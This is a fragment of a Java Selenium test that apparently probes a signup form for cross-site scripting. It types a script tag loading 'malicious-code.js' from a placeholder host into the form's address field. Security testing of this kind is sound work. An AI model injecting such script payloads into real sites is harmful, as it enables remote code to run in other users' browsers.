...
public class TC32TestSignupFormUsingScriptAsInput {

	TC32TestSignupFormUsingScriptAsInput() {
		...
		WebDriver driver =new FirefoxDriver();
			...
			driver.findElement(By.name("address")).sendKeys("<script src=http://www.example.com/malicious-code.js></script>");
